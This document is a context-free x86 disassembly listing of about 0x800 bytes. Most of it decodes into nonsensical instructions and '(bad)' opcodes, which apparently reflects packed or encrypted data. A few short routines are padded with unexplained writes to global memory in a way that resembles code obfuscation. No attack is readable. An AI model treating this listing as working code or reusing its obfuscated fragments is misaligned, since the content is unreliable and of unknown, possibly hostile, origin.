  408550:	sbb    esi,DWORD PTR [esi-0x72cdeb0b]
  408556:	out    dx,eax
  408557:	xlat   BYTE PTR ds:[ebx]
  408558:	aam    0x73
  40855a:	scas   eax,DWORD PTR es:[edi]
  40855b:	mov    edx,0xf5f039ce
  408560:	adc    eax,DWORD PTR ds:0x5dc6d98c
  408566:	jle    0x40852d
  408568:	mov    ds:0x72796b20,al
  40856d:	mov    ebp,0xcaee67a5
  408572:	push   ss
  408573:	inc    edi
  408574:	or     eax,0x6a1825e3
  408579:	xchg   BYTE PTR [ebp+0x8a6a6d],ah
  40857f:	sbb    DWORD PTR [ecx+0x69],ebp
  408582:	cmp    cl,BYTE PTR [ecx+ecx*1]
  408585:	cmp    BYTE PTR [ebx],0x0
  408588:	lds    ecx,FWORD PTR [edx]
  40858a:	std    
  40858b:	pop    ecx
  40858c:	into   
  40858d:	nop
  40858e:	mov    ah,0x2b
  408590:	push   edi
  408591:	mov    edi,0xfd14d565
  408596:	and    eax,DWORD PTR [esi]
  408598:	mov    bl,0x86
  40859a:	inc    esp
  40859b:	and    eax,0x37319309
  4085a0:	sbb    BYTE PTR [edi],0x66
  4085a3:	fild   QWORD PTR [esi-0x2a]
  4085a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085a7:	sub    eax,0xe7f46a8
  4085ac:	(bad)  
  4085ad:	test   eax,0xca157a97
  4085b2:	scas   eax,DWORD PTR es:[edi]
  4085b3:	jbe    0x4085d1
  4085b5:	(bad)  
  4085b6:	jnp    0x408609
  4085b8:	xor    eax,DWORD PTR [ebp+0x68c961be]
  4085be:	and    esi,edx
  4085c0:	push   ebx
  4085c1:	or     eax,0x427f2d62
  4085c6:	rol    BYTE PTR es:[edi],cl
  4085c9:	pop    es
  4085ca:	mov    eax,0xf647f98e
  4085cf:	xchg   ecx,eax
  4085d0:	cmp    ebx,edx
  4085d2:	push   0xffffffd3
  4085d4:	into   
  4085d5:	push   ebp
  4085d6:	pop    edx
  4085d7:	adc    eax,0xa4fbe6aa
  4085dc:	dec    esp
  4085dd:	mov    al,BYTE PTR [eax]
  4085df:	(bad)  
  4085e0:	cmp    eax,0x3022e55
  4085e5:	outs   dx,BYTE PTR ds:[esi]
  4085e6:	or     BYTE PTR [esi-0x14],0x36
  4085ea:	mov    eax,0x9db11ea7
  4085ef:	jge    0x408623
  4085f1:	mov    al,ds:0x56816eb7
  4085f6:	jle    0x408590
  4085f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085f9:	sti    
  4085fa:	jecxz  0x408605
  4085fc:	xchg   ebp,eax
  4085fd:	lods   al,BYTE PTR ds:[esi]
  4085fe:	sbb    ch,ah
  408600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408601:	jge    0x408636
  408603:	push   cs
  408604:	les    ebx,FWORD PTR [edx-0x48e959db]
  40860a:	sbb    BYTE PTR [edx+ebp*4-0x17],cl
  40860e:	addr16 clc 
  408610:	fwait
  408611:	ds hlt 
  408613:	pushf  
  408614:	stos   BYTE PTR es:[edi],al
  408615:	sbb    DWORD PTR [ecx],ecx
  408617:	in     eax,0x28
  408619:	sti    
  40861a:	lock je 0x408692
  40861d:	jecxz  0x4085fc
  40861f:	mov    al,ds:0x49260614
  408624:	cmp    ecx,DWORD PTR [edx+0x3b]
  408627:	sub    BYTE PTR [esp+ecx*4+0x2eca29f5],bl
  40862e:	jle    0x40863d
  408630:	dec    edx
  408631:	jne    0x40865c
  408633:	add    DWORD PTR [edi+eiz*4+0xf868426],eax
  40863a:	jbe    0x408693
  40863c:	push   ebx
  40863d:	das    
  40863e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40863f:	loop   0x408664
  408641:	(bad)  
  408642:	mov    cl,0x14
  408644:	mov    cl,0xe5
  408646:	fidiv  WORD PTR [esi+0x72ea5cae]
  40864c:	dec    ebx
  40864d:	in     eax,0xb0
  40864f:	lods   al,BYTE PTR ds:[esi]
  408650:	add    DWORD PTR [eax+0x76aaec0d],edi
  408656:	adc    al,BYTE PTR [edi]
  408658:	not    eax
  40865a:	imul   ecx,DWORD PTR [ebp-0x38e665a],0x33
  408661:	cmp    ecx,esi
  408663:	gs jbe 0x4086b2
  408666:	std    
  408667:	mov    BYTE PTR [ebx-0x7],0xa5
  40866b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40866c:	jno    0x40862c
  40866e:	mov    bh,0x55
  408670:	das    
  408671:	xchg   BYTE PTR [eax],ch
  408673:	call   0xddfd:0xb2e18ff5
  40867a:	fidivr WORD PTR [edi]
  40867c:	cwde   
  40867d:	xor    al,0xf8
  40867f:	jp     0x408657
  408681:	jno    0x408689
  408683:	push   edi
  408684:	jae    0x40867f
  408686:	sub    BYTE PTR [esi+0x2dee458c],ch
  40868c:	inc    edx
  40868d:	pop    ds
  40868e:	lods   al,BYTE PTR ds:[esi]
  40868f:	imul   edi,edx,0xc7a1b2f8
  408695:	sbb    BYTE PTR [edi+0x142a9cbc],dl
  40869b:	jo     0x408656
  40869d:	pop    ds
  40869e:	jg     0x4086f5
  4086a0:	jbe    0x40865d
  4086a2:	rcr    ch,0x9e
  4086a5:	xchg   edx,eax
  4086a6:	or     eax,0xbd8cc174
  4086ab:	stos   DWORD PTR es:[edi],eax
  4086ac:	(bad)  
  4086ae:	jb     0x408719
  4086b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086b2:	inc    eax
  4086b3:	or     al,0xf2
  4086b5:	pop    ss
  4086b6:	(bad)  
  4086b8:	test   eax,0x568ab3f0
  4086bd:	clc    
  4086be:	gs inc edx
  4086c0:	adc    al,0xdf
  4086c2:	jge    0x40870f
  4086c4:	loope  0x4086c2
  4086c6:	xchg   esp,eax
  4086c7:	or     BYTE PTR [esi],0xd7
  4086ca:	test   BYTE PTR [ebp-0x21],0x9d
  4086ce:	fisubr WORD PTR [ecx+0x5]
  4086d1:	mov    WORD PTR [esp+ecx*8],ss
  4086d4:	shl    DWORD PTR [edi+edx*4],0x67
  4086d8:	int    0x2e
  4086da:	or     DWORD PTR [edi-0x20d341ca],edi
  4086e0:	mov    ds:0x56358370,eax
  4086e5:	bnd jle 0x408738
  4086e8:	rol    BYTE PTR [edi+0x3b3bf5be],cl
  4086ee:	sbb    BYTE PTR [edx+edi*1],cl
  4086f1:	daa    
  4086f2:	stos   BYTE PTR es:[edi],al
  4086f3:	jnp    0x4086b8
  4086f5:	mov    esi,0xe96c019f
  4086fa:	cmp    eax,edx
  4086fc:	lds    eax,FWORD PTR [edx-0x2d2abae6]
  408702:	sub    BYTE PTR [edx+edi*8],bl
  408705:	sub    BYTE PTR [ebx],cl
  408707:	and    eax,0x4fd065f8
  40870c:	fidiv  WORD PTR [esi-0x11]
  40870f:	or     eax,0x6ff82a80
  408714:	fld    QWORD PTR [esi-0x6e621703]
  40871b:	pushf  
  40871c:	mov    ecx,0x6c059289
  408721:	sub    dh,BYTE PTR [edi]
  408723:	xlat   BYTE PTR ds:[ebx]
  408724:	daa    
  408725:	in     al,0xf0
  408727:	test   al,bl
  408729:	jmp    0x4bd2:0xb7848713
  408730:	test   ch,dh
  408732:	ror    BYTE PTR [edi-0x12],0x43
  408736:	cmp    cl,ah
  408738:	inc    edx
  408739:	fwait
  40873a:	mov    ecx,0x7555d2d9
  40873f:	adc    al,0x1d
  408741:	dec    esi
  408742:	mov    esi,0x4170db00
  408747:	aas    
  408748:	push   es
  408749:	arpl   WORD PTR [ebx+ebp*4],bp
  40874c:	(bad)  
  40874d:	(bad)  [ebx-0x31]
  408750:	sbb    al,0x42
  408752:	push   0x3866479a
  408757:	or     al,0x76
  408759:	stc    
  40875a:	arpl   WORD PTR [esi-0x62],di
  40875d:	push   ss
  40875e:	outs   dx,DWORD PTR ds:[esi]
  40875f:	(bad)  
  408760:	fdiv   DWORD PTR [esi]
  408762:	mov    cl,0x24
  408764:	push   cs
  408765:	pop    ss
  408766:	sbb    esp,esp
  408768:	clc    
  408769:	retf   
  40876a:	push   esp
  40876b:	and    bl,BYTE PTR [esi+0x16]
  40876e:	out    dx,eax
  40876f:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408771:	or     eax,0x6c64c197
  408776:	int    0xd5
  408778:	sub    bl,BYTE PTR [ebp-0xd3a4713]
  40877e:	cld    
  40877f:	cmp    BYTE PTR [esi+0x72a76d0a],bl
  408785:	pop    edx
  408786:	cdq    
  408787:	dec    edx
  408788:	mov    eax,ds:0xe9b04faf
  40878d:	push   eax
  40878e:	jmp    0x4087cf
  408790:	pop    ebx
  408791:	in     al,dx
  408792:	and    ecx,DWORD PTR es:[ebp-0x1aa74ac7]
  408799:	cli    
  40879a:	mov    DWORD PTR [ecx+ebp*1+0x42],eax
  40879e:	mov    ecx,DWORD PTR [ecx-0x4]
  4087a1:	test   dh,ch
  4087a3:	jnp    0x4087c1
  4087a5:	outs   dx,BYTE PTR ds:[esi]
  4087a6:	cdq    
  4087a7:	(bad)  
  4087a8:	adc    al,0xbb
  4087aa:	jge    0x408739
  4087ac:	push   ds
  4087ad:	lock push eax
  4087af:	xchg   edi,eax
  4087b0:	hlt    
  4087b1:	lods   al,BYTE PTR ds:[esi]
  4087b2:	xor    eax,0x715869a0
  4087b7:	pop    esp
  4087b8:	(bad)  
  4087b9:	popw   ss
  4087bb:	retf   0x82f8
  4087be:	fcom   QWORD PTR [edi+0x47056e4c]
  4087c4:	stos   DWORD PTR es:[edi],eax
  4087c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087c6:	mov    DWORD PTR [esi-0x3e],ecx
  4087c9:	nop
  4087ca:	lock in al,dx
  4087cc:	inc    esi
  4087cd:	mov    dl,0xdf
  4087cf:	mov    edx,0xc54b1a58
  4087d4:	aad    0xca
  4087d6:	fwait
  4087d7:	js     0x4087f0
  4087d9:	sbb    DWORD PTR [ecx-0x17087ec0],edi
  4087df:	mov    ch,BYTE PTR [ebx]
  4087e1:	pushf  
  4087e2:	mov    ecx,edi
  4087e4:	shrd   eax,ecx,0x2
  4087e8:	or     eax,DWORD PTR [ebp+0x10]
  4087eb:	shr    ecx,0x2
  4087ee:	or     ecx,DWORD PTR [ebp+0x14]
  4087f1:	jmp    0x408b92
  4087f6:	sbb    cl,cl
  4087f8:	ins    DWORD PTR es:[edi],dx
  4087f9:	xchg   esi,eax
  4087fa:	mov    bl,0xba
  4087fc:	cmp    BYTE PTR [edx+ebp*4-0x21],cl
  408800:	xchg   esp,eax
  408801:	nop
  408802:	dec    esi
  408803:	(bad)  
  408804:	scas   al,BYTE PTR es:[edi]
  408805:	iret   
  408806:	mov    esi,0xbdbebe73
  40880b:	les    edi,FWORD PTR [esi-0x79322a42]
  408811:	rcr    DWORD PTR [edi],0xe2
  408814:	xchg   BYTE PTR [eax+eax*8+0x5c],al
  408818:	mov    ecx,0x9441e92f
  40881d:	jp     0x40883b
  40881f:	popa   
  408820:	test   eax,0xfdcdf99e
  408825:	xor    DWORD PTR [edi+0x7e],ecx
  408828:	aad    0x1
  40882a:	ret    
  40882b:	cmp    ah,BYTE PTR fs:0xa1bae9e0
  408832:	sbb    al,0xef
  408834:	sub    eax,0xac776011
  408839:	xchg   BYTE PTR [edi+0x58],ah
  40883c:	push   0xffffffa4
  40883e:	cdq    
  40883f:	pushf  
  408840:	pop    esi
  408841:	or     ch,BYTE PTR [edi-0x60]
  408844:	adc    eax,0x14a447
  408849:	data16 and al,BYTE PTR [ecx+0x5aae81b7]
  408850:	ficom  WORD PTR [ebp+esi*2-0xb]
  408854:	es pop edx
  408856:	pop    esp
  408857:	adc    dh,BYTE PTR [edx]
  408859:	pop    eax
  40885a:	pop    esp
  40885b:	lods   eax,DWORD PTR ds:[esi]
  40885c:	pop    es
  40885d:	pushf  
  40885e:	adc    ecx,DWORD PTR [edx-0x34]
  408861:	and    DWORD PTR [ecx+eax*4],ecx
  408864:	fld    DWORD PTR [ebx-0x2b]
  408867:	push   ecx
  408868:	test   al,0xa5
  40886a:	adc    eax,0xe90fe46c
  40886f:	adc    al,0x0
  408871:	xchg   esi,eax
  408872:	(bad)
  408875:	fcmovbe st,st(6)
  408877:	shl    DWORD PTR [esi+0x8],0x83
  40887b:	pop    esi
  40887c:	push   ebx
  40887e:	mov    eax,ds:0xbf2c3f23
  408883:	jl     0x408891
  408885:	std    
  408886:	mov    dl,0xb1
  408888:	cwde   
  408889:	pop    DWORD PTR [edx-0x430a5221]
  40888f:	push   0x66
  408891:	inc    ecx
  408892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408893:	add    BYTE PTR [ebp+0x19683bf3],dl
  408899:	cmp    eax,0x9d4c84b
  40889e:	push   0x61
  4088a0:	in     al,dx
  4088a1:	iret   
  4088a2:	mov    bh,0xaf
  4088a4:	in     al,0xaa
  4088a6:	jb     0x408924
  4088a8:	mov    ebx,DWORD PTR [eax-0x51]
  4088ab:	clc    
  4088ac:	retf   
  4088ad:	sub    edi,eax
  4088af:	and    al,0x30
  4088b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088b2:	in     eax,0x98
  4088b4:	in     eax,dx
  4088b5:	inc    esp
  4088b6:	inc    edx
  4088b7:	cli    
  4088b8:	adc    ch,bh
  4088ba:	pop    esp
  4088bb:	jnp    0x408908
  4088bd:	test   DWORD PTR [ebp+0x2f],0x804f558d
  4088c4:	mov    ch,0xff
  4088c6:	shl    DWORD PTR ds:0x4c3eb7dc,0xc7
  4088cd:	(bad)  
  4088cf:	int    0xbf
  4088d1:	arpl   WORD PTR [ebp-0x3c835c80],cx
  4088d7:	stos   BYTE PTR es:[edi],al
  4088d8:	adc    DWORD PTR [ebx-0x25d64ee0],0x6fc8f2ea
  4088e2:	xchg   ebx,eax
  4088e3:	push   eax
  4088e4:	sub    DWORD PTR [esi-0x32],ebx
  4088e7:	mov    al,ds:0x9d1e906f
  4088ec:	mov    ebp,0x17c46d07
  4088f1:	fidiv  DWORD PTR [esi-0x34]
  4088f4:	inc    ebp
  4088f5:	fdivr  DWORD PTR [edi+esi*4-0x1dfbbf05]
  4088fc:	xchg   esp,eax
  4088fd:	(bad)  [esi-0x732f1015]
  408903:	sub    eax,0x1a2e4ea6
  408908:	sub    DWORD PTR [ebp+0x33],ebx
  40890b:	push   0x1ca9c090
  408910:	jmp    0x7a08a183
  408915:	aam    0xde
  408917:	loopne 0x4088c2
  408919:	scas   eax,DWORD PTR es:[edi]
  40891a:	xchg   esi,eax
  40891b:	(bad)  
  40891c:	not    DWORD PTR [ecx+0x26]
  40891f:	loop   0x40895d
  408921:	xor    ebp,DWORD PTR [ecx]
  408923:	xchg   esp,eax
  408924:	push   ebp
  408925:	add    eax,0x73a3fbb6
  40892a:	add    al,0x32
  40892c:	mov    dl,0xfd
  40892e:	lds    esi,FWORD PTR [esp+edx*1]
  408931:	mov    edi,0x89788b17
  408936:	push   edi
  408937:	inc    edi
  408938:	or     bl,ah
  40893a:	or     al,BYTE PTR [edi+0x22e58bc7]
  408940:	ja     0x408960
  408942:	mov    bl,0x1a
  408944:	fcom   DWORD PTR [ebp-0x26]
  408947:	add    bh,BYTE PTR [ebx+0x49]
  40894a:	data16 jbe 0x4088ef
  40894d:	mov    eax,ds:0x9e122540
  408952:	pop    edi
  408953:	fucompp 
  408955:	fld    QWORD PTR ds:0x11c78211
  40895b:	jmp    0x824c8fad
  408960:	jge    0x4089b9
  408962:	sahf   
  408963:	adc    ebx,DWORD PTR [ebp+0x325f841a]
  408969:	fisub  DWORD PTR [edx-0x1c829a0d]
  40896f:	inc    ebx
  408970:	jnp    0x408983
  408972:	cmovno edx,esi
  408975:	jg     0x408928
  408977:	jp     0x408933
  408979:	mov    cl,0x7b
  40897b:	mov    ds,WORD PTR [esp+ecx*2+0x1d]
  40897f:	jmp    0xc407:0xefb16890
  408986:	into   
  408987:	push   eax
  408988:	mov    eax,ds:0xaf6d5cd4
  40898d:	sbb    eax,0x728919fd
  408992:	(bad)  
  408993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408994:	and    ebp,DWORD PTR [edi+ebx*1-0x35813878]
  40899b:	push   edi
  40899c:	test   BYTE PTR [edi],bh
  40899e:	mov    dh,0x1f
  4089a0:	push   edi
  4089a1:	pop    ebx
  4089a2:	leave  
  4089a3:	push   ecx
  4089a4:	ret    
  4089a5:	dec    eax
  4089a6:	ds pop esi
  4089a8:	out    dx,eax
  4089a9:	loope  0x40896f
  4089ab:	dec    edi
  4089ac:	aad    0x91
  4089ae:	lea    ebx,[ebp+0x75a1a679]
  4089b4:	shr    BYTE PTR [esi],cl
  4089b6:	outs   dx,BYTE PTR ds:[esi]
  4089b7:	clc    
  4089b8:	iret   
  4089b9:	sbb    eax,0xe34a301c
  4089be:	into   
  4089bf:	jbe    0x40896b
  4089c1:	dec    ecx
  4089c2:	stc    
  4089c3:	(bad)  
  4089c4:	out    dx,eax
  4089c5:	dec    edx
  4089c6:	jmp    0x18ef:0x7e3cddfd
  4089cd:	pmulhw mm3,QWORD PTR [ebp-0x17]
  4089d1:	ffree  st(7)
  4089d3:	sahf   
  4089d4:	aas    
  4089d5:	sahf   
  4089d6:	popa   
  4089d7:	mov    cl,0xe6
  4089d9:	pop    edi
  4089da:	cwde   
  4089db:	cmp    bh,cl
  4089dd:	xor    DWORD PTR [ecx],edi
  4089df:	cmp    BYTE PTR [ebp+esi*8-0x7a2f3a01],0x2
  4089e7:	pop    ss
  4089e8:	xor    BYTE PTR [ebp+ebx*2-0x1b],bh
  4089ec:	in     eax,dx
  4089ed:	mov    ds:0x69d00883,al
  4089f2:	dec    esp
  4089f3:	mov    ecx,0x82f7d609
  4089f8:	cmove  edi,edi
  4089fb:	fidivr WORD PTR [ebx+0x3b43dfe5]
  408a01:	fld    TBYTE PTR ds:0x76062048
  408a07:	dec    edi
  408a08:	jle    0x4089c2
  408a0a:	(bad)  
  408a0b:	cdq    
  408a0c:	jne    0x408a78
  408a0e:	push   0x7d
  408a10:	push   esi
  408a11:	sbb    ecx,DWORD PTR [esi]
  408a13:	dec    edx
  408a14:	and    ch,cl
  408a16:	sbb    cl,BYTE PTR [edx]
  408a18:	rol    DWORD PTR [ebp+0x54],1
  408a1b:	fstp   st(2)
  408a1d:	(bad)  
  408a1e:	push   0x2e67cbe5
  408a23:	stos   BYTE PTR es:[edi],al
  408a24:	(bad)  
  408a25:	jmp    0x3293:0xe0fe5313
  408a2c:	xor    edi,esp
  408a2e:	push   ebp
  408a2f:	call   0x7722:0x64dd8695
  408a36:	nop
  408a37:	cwde   
  408a38:	xor    DWORD PTR [ebp+0x2f9c1f4d],esp
  408a3e:	pop    esi
  408a3f:	lods   eax,DWORD PTR ds:[esi]
  408a40:	cmp    bh,al
  408a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a43:	sub    ebp,eax
  408a45:	adc    eax,0x139d5fa1
  408a4a:	sbb    BYTE PTR [eax-0x1d],0x1b
  408a4e:	dec    eax
  408a4f:	data16 aaa 
  408a51:	pop    ecx
  408a52:	mov    edi,0xddf422ba
  408a57:	test   al,0x4
  408a59:	ds fucom st(6)
  408a5c:	imul   esi,ebp,0xd
  408a5f:	inc    eax
  408a60:	retf   0xe4af
  408a63:	sbb    ebp,esp
  408a65:	xor    DWORD PTR [edx+0x2f],0xa89f0734
  408a6c:	jo     0x4089f6
  408a6e:	arpl   WORD PTR [eax],cx
  408a70:	jmp    0x36ec:0x40556cdc
  408a77:	xor    al,BYTE PTR [esi+0x6f]
  408a7a:	jge    0x408af0
  408a7c:	jmp    0x408aa1
  408a7e:	push   eax
  408a7f:	mov    edi,0x2070d22b
  408a84:	pop    ecx
  408a85:	inc    edi
  408a86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a87:	xor    DWORD PTR [edi+0x7eeee97],ecx
  408a8d:	cmp    BYTE PTR [ecx+0x5196dfe9],ah
  408a93:	outs   dx,BYTE PTR ds:[esi]
  408a94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a95:	fsubp  st(6),st
  408a97:	adc    BYTE PTR [edi-0x567eab15],al
  408a9d:	inc    eax
  408a9e:	aam    0x98
  408aa0:	imul   esp,esi,0x1c
  408aa3:	std    
  408aa4:	adc    bl,BYTE PTR [ecx]
  408aa6:	dec    edx
  408aa7:	jge    0x408a9c
  408aa9:	pop    eax
  408aaa:	cmp    cl,cl
  408aac:	sub    al,0xe8
  408aae:	xchg   esp,eax
  408aaf:	es ss ins DWORD PTR es:[edi],dx
  408ab2:	lea    esi,[eax+esi*2+0x1a]
  408ab6:	dec    edx
  408ab7:	inc    eax
  408ab8:	push   edx
  408ab9:	sbb    eax,esi
  408abb:	stc    
  408abc:	call   0x4adddc8d
  408ac1:	mov    al,ds:0xa558c67d
  408ac6:	pop    ebp
  408ac7:	shr    eax,1
  408ac9:	xchg   edx,eax
  408aca:	mov    al,0x5f
  408acc:	cmp    dl,bh
  408ace:	and    BYTE PTR [ebp-0x3f0d749f],ch
  408ad4:	cmp    DWORD PTR ds:0x405625eb,esi
  408ada:	push   eax
  408adb:	loopne 0x408a6d
  408add:	sbb    eax,0x940cb38c
  408ae2:	dec    edi
  408ae3:	out    dx,eax
  408ae4:	jg     0x408aba
  408ae6:	std    
  408ae7:	shr    ch,0xf
  408aea:	loope  0x408ae1
  408aec:	jg     0x408ab5
  408aee:	xchg   edx,eax
  408aef:	cmovae eax,DWORD PTR [ebx-0x16]
  408af3:	shl    al,1
  408af5:	dec    esi
  408af6:	sub    esi,DWORD PTR [esp+ebp*4-0x3b26f274]
  408afd:	shl    DWORD PTR [edi-0x45],cl
  408b00:	jl     0x408abf
  408b02:	test   BYTE PTR [ecx+0x635884e9],0xb7
  408b09:	sahf   
  408b0a:	stc    
  408b0b:	in     al,0x67
  408b0d:	dec    esp
  408b0e:	(bad)  
  408b0f:	in     eax,dx
  408b10:	fdiv   QWORD PTR [edx]
  408b12:	adc    al,al
  408b14:	or     eax,0xe6a52850
  408b19:	dec    esi
  408b1a:	daa    
  408b1b:	and    dh,BYTE PTR [ecx-0x226ed152]
  408b21:	push   0xb
  408b23:	and    eax,0xb9328a43
  408b28:	push   0xffffffb4
  408b2a:	mov    dl,ah
  408b2c:	mov    dl,0x60
  408b2e:	out    dx,al
  408b2f:	jo     0x408ba8
  408b31:	call   0x96c0:0xc75df76d
  408b38:	popf   
  408b39:	mov    cs,WORD PTR [esi-0x55095b0f]
  408b3f:	sub    al,0xcb
  408b41:	out    0x54,al
  408b43:	dec    edi
  408b44:	aaa    
  408b45:	sbb    BYTE PTR [esi],dh
  408b47:	sbb    bl,ch
  408b49:	mov    ecx,0xe0815267
  408b4e:	(bad)  
  408b50:	lods   al,BYTE PTR ds:[esi]
  408b51:	shl    edi,cl
  408b53:	or     BYTE PTR [eax+0xca78d29],ah
  408b59:	lahf   
  408b5a:	call   DWORD PTR [ecx-0x3c72cf74]
  408b60:	mov    esp,0x3518063e
  408b65:	test   al,0xeb
  408b67:	shr    ecx,cl
  408b69:	in     al,dx
  408b6a:	outs   dx,DWORD PTR ds:[esi]
  408b6b:	test   al,0xdc
  408b6d:	jl     0x408b57
  408b6f:	xchg   ebx,eax
  408b70:	pop    edx
  408b71:	inc    edx
  408b72:	sbb    DWORD PTR [edi],esp
  408b74:	xchg   esi,eax
  408b75:	jnp    0x408b3e
  408b77:	sub    BYTE PTR [ebx+0x44c3b92f],ch
  408b7d:	leave  
  408b7e:	shl    DWORD PTR [ebp-0x5b],1
  408b81:	std    
  408b82:	push   cs
  408b83:	(bad)  
  408b84:	or     BYTE PTR [edi+0x1b],dh
  408b87:	inc    eax
  408b88:	scas   eax,DWORD PTR es:[edi]
  408b89:	pop    ebx
  408b8a:	fs mov edx,0x5a5ca326
  408b90:	cwde   
  408b91:	mov    WORD PTR [ebx],?
  408b93:	ror    BYTE PTR [edi],1
  408b95:	test   DWORD PTR [ecx],ecx
  408b97:	add    BYTE PTR [eax],al
  408b99:	add    BYTE PTR [ecx],bh
  408b9b:	dec    ebp
  408b9c:	or     al,0xf
  408b9e:	test   BYTE PTR [eax],dl
  408ba0:	add    BYTE PTR [eax],al
  408ba2:	add    bh,bh
  408ba4:	jne    0x408bc6
  408ba6:	push   DWORD PTR [ebp+0x1c]
  408ba9:	push   DWORD PTR [ebp+0x18]
  408bac:	push   ebx
  408bad:	push   esi
  408bae:	call   0x411472
  408bb3:	pop    edi
  408bb4:	leave  
  408bb5:	ret    0x1c
  408bb8:	cmp    cl,0x40
  408bbb:	jae    0x408bf8
  408bc1:	cmp    cl,0x20
  408bc4:	mov    DWORD PTR ds:0x42833d,0x1ce5
  408bce:	jae    0x408be4
  408bd4:	xor    DWORD PTR ds:0x428501,0x6917
  408bde:	shrd   eax,edx,cl
  408be1:	shr    edx,cl
  408be3:	ret    
  408be4:	mov    eax,edx
  408be6:	xor    edx,edx
  408be8:	and    cl,0x1f
  408beb:	mov    DWORD PTR ds:0x428559,0x321d
  408bf5:	shr    eax,cl
  408bf7:	ret    
  408bf8:	xor    eax,eax
  408bfa:	xor    edx,edx
  408bfc:	ret    
  408bfd:	push   ebp
  408bfe:	mov    ebp,esp
  408c00:	jmp    0x408e7f
  408c05:	addr16 hlt 
  408c07:	js     0x408c4d
  408c09:	jl     0x408c57
  408c0b:	jnp    0x408c09
  408c0d:	dec    edx
  408c0e:	xlat   BYTE PTR ds:[ebx]
  408c0f:	pop    esi
  408c10:	sahf   
  408c11:	ror    BYTE PTR [eax-0x41],0xcf
  408c15:	mov    ebp,0x79bebe79
  408c1a:	ret    0xbebe
  408c1d:	push   cs
  408c1e:	rol    eax,cl
  408c20:	ret    
  408c21:	fld    QWORD PTR [edi+edx*2+0x10]
  408c25:	sahf   
  408c26:	or     eax,DWORD PTR [esi+0x7db0febc]
  408c2c:	stc    
  408c2d:	ret    0xe9b5
  408c30:	mov    bh,0x77
  408c32:	(bad)  
  408c33:	push   ecx
  408c34:	jmp    0x408c66
  408c36:	(bad)  
  408c37:	rcr    BYTE PTR [eax],cl
  408c39:	fmul   DWORD PTR [edi]
  408c3b:	mov    esp,0xaa1fb461
  408c40:	into   
  408c41:	jl     0x408ca6
  408c43:	pop    eax
  408c44:	enter  0xdff3,0x55
  408c48:	dec    ebx
  408c49:	je     0x408c20
  408c4b:	or     al,0xe0
  408c4d:	mov    esp,0x4e337113
  408c52:	(bad)  
  408c53:	lea    ebx,[eax-0x14]
  408c56:	cld    
  408c57:	mov    cl,0x18
  408c59:	rcr    edi,1
  408c5b:	ss inc edi
  408c5d:	in     al,0x8c
  408c5f:	retf   
  408c60:	xchg   edx,eax
  408c61:	sub    DWORD PTR [eax],edi
  408c63:	and    BYTE PTR [ecx],bl
  408c65:	xor    al,0xf3
  408c67:	xchg   ecx,eax
  408c68:	pusha  
  408c69:	hlt    
  408c6a:	inc    edx
  408c6b:	sahf   
  408c6c:	push   ebx
  408c6d:	xchg   edx,eax
  408c6e:	js     0x408cca
  408c70:	stos   BYTE PTR es:[edi],al
  408c71:	mov    ds:0x54b9454e,eax
  408c76:	mov    ah,0x32
  408c78:	retf   
  408c79:	scas   eax,DWORD PTR es:[edi]
  408c7a:	add    eax,0xca764b85
  408c7f:	jle    0x408cf8
  408c81:	ret    
  408c82:	js     0x408c1e
  408c84:	push   0x73
  408c86:	jne    0x408c81
  408c88:	shl    DWORD PTR [edx+0x61],1
  408c8b:	out    0x3a,eax
  408c8d:	into   
  408c8e:	or     DWORD PTR [edi-0x6ac0ed2],eax
  408c94:	outs   dx,DWORD PTR ds:[esi]
  408c95:	call   0xeef3:0x7dd34de1
  408c9c:	in     eax,dx
  408c9d:	cmp    DWORD PTR [edx-0x3b13560d],ecx
  408ca3:	xchg   ecx,eax
  408ca4:	sbb    bl,BYTE PTR [ecx-0x2603d6f0]
  408caa:	fisub  DWORD PTR [edi-0xd10e9ef]
  408cb0:	test   edx,0x5bc60037
  408cb6:	xor    eax,DWORD PTR [ecx-0x64a0aa7]
  408cbc:	xor    eax,0x79caba96
  408cc1:	adc    eax,0x719d56c6
  408cc6:	or     DWORD PTR [ecx-0x12],edi
  408cc9:	xchg   DWORD PTR [ecx],edx
  408ccb:	adc    DWORD PTR fs:[edi+0x35],edi
  408ccf:	jecxz  0x408c7a
  408cd1:	cmp    ah,BYTE PTR [edi-0x41733ea5]
  408cd7:	cmp    dh,BYTE PTR [eax-0x48]
  408cda:	cs pop ss
  408cdc:	int3   
  408cdd:	test   al,0x7e
  408cdf:	xor    eax,0x42a66e3e
  408ce4:	push   edi
  408ce5:	dec    esi
  408ce6:	iret   
  408ce7:	pop    ebx
  408ce8:	ds xchg ebp,eax
  408cea:	pop    ecx
  408ceb:	test   al,0xaa
  408ced:	add    DWORD PTR [ecx+0x38dccb0c],ebx
  408cf3:	std    
  408cf4:	repz push esi
  408cf6:	ss adc ah,al
  408cf9:	je     0x408c8a
  408cfb:	clc    
  408cfc:	sub    al,0x61
  408cfe:	mov    al,0xdd
  408d00:	ds push 0xe
  408d03:	fld    DWORD PTR [ecx]
  408d05:	aaa    
  408d06:	xchg   DWORD PTR [ebx-0x5b],esi
  408d09:	lock inc DWORD PTR [esp+edx*1+0x62]
  408d0e:	ins    BYTE PTR es:[edi],dx
  408d0f:	jns    0x408d1c
  408d11:	pop    edi
  408d12:	mov    al,0xb
  408d14:	into   
  408d15:	and    eax,0x5f6507e2
  408d1a:	sbb    al,0xff
  408d1c:	jecxz  0x408d50
  408d1e:	cwde   
  408d1f:	sub    edi,ebx
  408d21:	arpl   WORD PTR [ebp+0x14],bp
  408d24:	push   0xffffffb2
  408d26:	sahf   
  408d27:	push   esi
